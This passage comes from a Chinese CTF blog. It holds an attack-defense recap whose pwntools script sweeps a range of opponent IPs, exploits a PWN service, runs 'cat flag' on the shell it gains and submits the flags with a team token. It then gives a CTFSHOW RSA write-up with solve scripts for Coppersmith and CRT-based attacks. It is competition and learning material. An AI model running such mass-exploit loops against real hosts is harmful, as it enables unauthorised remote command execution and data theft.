sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;DJR&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cd ../&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>这是打PWN3的，平均每次可以得到45个flag，但后来发现这题几乎所有的队伍都没有防住，说是可能题目有问题patch了之后check不过，而且还被攻击，第一名的白泽正是如此，所以应该有接近60个的flag，看来中间还是有我没解决的实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> []:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        io = remote(ipi, ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;flappybird666666&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>虽然确实没有什么技术含量的脚本，但在比赛中还是有点用的吧</p>
<h2 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h2><p>还有队内交流真的十分重要，两个随身携带的U盘被我们传来传去</p>
<p>没啥想说的，路还远，时间不多了，走吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>CTFSHOW funnyrsa&amp;unusualrsa系列</title>
    <url>/posts/80806ae5/</url>
    <content><![CDATA[<p>这两个系列有针对RSA密码中，$gcd(e, phi)\neq 1$的，之前Striving师傅也说，这是一个考的大类，特地来重新整理和记录一下，主要是翻译一下la佬的博客</p>
<span id="more"></span>

<h1 id="CTFSHOW-funnyrsa-amp-unusualrsa系列"><a href="#CTFSHOW-funnyrsa-amp-unusualrsa系列" class="headerlink" title="CTFSHOW funnyrsa&amp;unusualrsa系列"></a>CTFSHOW funnyrsa&amp;unusualrsa系列</h1><h2 id="funnyrsa1"><a href="#funnyrsa1" class="headerlink" title="funnyrsa1"></a>funnyrsa1</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">14606334023791426</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">13813369129257838</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>我记得这道题当时困扰了我好久，看网上的WP，去问别的师傅，都不能很好地理解；主要是数论的基础不过关吧</p>
<p>现在再来过一遍</p>
<p>可以看出p1和p2是同一个数，e1和e2分可以分解成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">2</span> * <span class="number">7</span> * <span class="number">1043309573127959</span></span><br><span class="line">e2 = <span class="number">2</span> * <span class="number">7</span> * <span class="number">986669223518417</span></span><br></pre></td></tr></table></figure>

<p>我直接用下有限域开方（这个后面unusualrsa5也会提到一些），直接出来</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210709101537063.png" alt="image-20210709101537063"></p>
<p>然后记得将中间那个奇怪的东西转换成φ</p>
<p>第一次遇到这道题，主要参考一篇CSDN上的推导，主要是当时e=14试过小指数枚举k，也开不出来就没啥思路了</p>
<p><a href="https://blog.csdn.net/chenzzhenguo/article/details/94339659">https://blog.csdn.net/chenzzhenguo/article/details/94339659</a></p>
<p>现在再观摩一遍又学到了好多，如果不用有限域开14次方的话，由于e=7已经和phi1和phi2都有公因子了，不能继续化简指数，而且经检验，q不满足rabin的条件<br>$$<br>q\ mod\ 4=1<br>$$<br>不过p没有<br>$$<br>p\ mod\ 4=3<br>$$<br>所以这位师傅想到了借助中国剩余定理的思路，着实巧妙</p>
<p>为了方便理清思绪，我把上面的脚本和得出来的新c1和c2展示一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">1043309573127959</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">986669223518417</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line"></span><br><span class="line">phi1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n1 = p1*q1</span><br><span class="line">n2 = p2*q2</span><br><span class="line"></span><br><span class="line">d1 = invert(e1, phi1)</span><br><span class="line">d2 = invert(e2, phi2)</span><br><span class="line"></span><br><span class="line">c1_14 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line">c2_14 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c1_14)</span><br><span class="line"><span class="built_in">print</span>(c2_14)</span><br></pre></td></tr></table></figure>

<p>首先用CRT将$m^{14}$转换成在模q1q2下，那个师傅还把p加上了，其实没有必要，选两个就好了<br>$$<br>\begin{align}<br>m^{14}\equiv c_1\ (mod\ q_1)\\<br>m^{14}\equiv c_2\ (mod\ q_2)<br>\end{align}<br>$$<br>解出来的解我们设为c3，将问题转换成新的rsa问题<br>$$<br>m^{14}\equiv c_3\ (mod\ q_1\cdot q_2)<br>$$<br>在如今的局势下，我们可以用上面的思路，先继续化简e，因为发现新的phi和7是互素的；出来的c很小，用小指数攻击就解出来<br>$$<br>c^2\equiv m\ (mod\ n)<br>$$<br>注意这里可不能用rabin，因为上面就说过，q是不满足rabin条件的，平方根算法倒可以试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">c = <span class="number">1468508928650711840448592864366550012730179472363882262465351327446412035872207980397128114769992338577161</span></span><br><span class="line">p = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">q = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(nthroot_mod(c, <span class="number">2</span>, p)))</span><br></pre></td></tr></table></figure>

<p>可解</p>
<h2 id="funnyrsa2"><a href="#funnyrsa2" class="headerlink" title="funnyrsa2"></a>funnyrsa2</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = getPrime(<span class="number">80</span>)</span><br><span class="line">q = getPrime(<span class="number">80</span>)</span><br><span class="line">r = getPrime(<span class="number">80</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># n = 897607935780955837078784515115186203180822213482989041398073067996023639</span></span><br><span class="line"><span class="comment"># c = 490571531583321382715358426750276448536961994273309958885670149895389968</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;what_that_fvck_r&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="funnyrsa3"><a href="#funnyrsa3" class="headerlink" title="funnyrsa3"></a>funnyrsa3</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>dp泄漏攻击，看我博客<a href="https://blog.csdn.net/m0_49109277/article/details/113622053?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_49109277/article/details/113622053?spm=1001.2014.3001.5501</a></p>
<h2 id="unusualrsa1"><a href="#unusualrsa1" class="headerlink" title="unusualrsa1"></a>unusualrsa1</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(long_to_bytes(randint(<span class="number">0</span>,<span class="number">30</span>))*<span class="number">208</span>+flag)</span><br><span class="line"><span class="keyword">assert</span>(m.bit_length()==<span class="number">2044</span>)</span><br><span class="line"><span class="built_in">print</span>((m&gt;&gt;<span class="number">315</span>)&lt;&lt;<span class="number">315</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,<span class="number">3</span>,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line"><span class="comment">#1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line"><span class="comment">#6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>已知m高位，用CopperSmith已知明文高位攻击</p>
<p>拿la佬的脚本来做la佬的题，嘿嘿</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line">mbar = <span class="number">1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line">c = <span class="number">6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">kbits = <span class="number">315</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x) ^ e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mbar + x0))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原理</p>
</blockquote>
<p>先搞清楚题目意思；下面这个print操作显然是将m的低315位变成0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>((m&gt;&gt;<span class="number">315</span>)&lt;&lt;<span class="number">315</span>)</span><br></pre></td></tr></table></figure>

<p>我们直接将m转变成字节，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0cflag&#123;r54X\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>显然前面208个<code>\x0c</code>就是随机生成的填充，还有一点flag的头部信息，剩下就全部都是0了</p>
<blockquote>
<p>CopperSmith已知明文高位攻击</p>
</blockquote>
<p>而CopperSmith已知明文高位攻击的模式就是，</p>
<p>当$|x|\leq N^{\frac{1}{e}}$，其中$m=mbar+x$时，下列关于x的方程<br>$$<br>c=m^e\ mod\ n=(mbar+x)^e\ mod\ n，其中mbar=(m&gt;&gt;kbits)&lt;&lt;kbits<br>$$<br>有解</p>
<p>首先我们验证下，条件是否满足；x是315位的，$N^\frac{1}{e}$约有683，条件成立</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708112626326.png" alt="image-20210708112626326"></p>
<p>所以显然对于已知明文高位的攻击，还需要e比较小这个条件，不然e=65537明显解不出来</p>
<p>然后看代码理解；主要的是用到了格，求小根这一类的东西。先构造好上面的方程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = (mbar + x) ^ e - c</span><br></pre></td></tr></table></figure>

<p>然后直接small_roots，设置一下参数。但是更多的也不懂了</p>
<h2 id="unusualrsa2"><a href="#unusualrsa2" class="headerlink" title="unusualrsa2"></a>unusualrsa2</h2><blockquote>
<p>题目描述</p>
</blockquote>
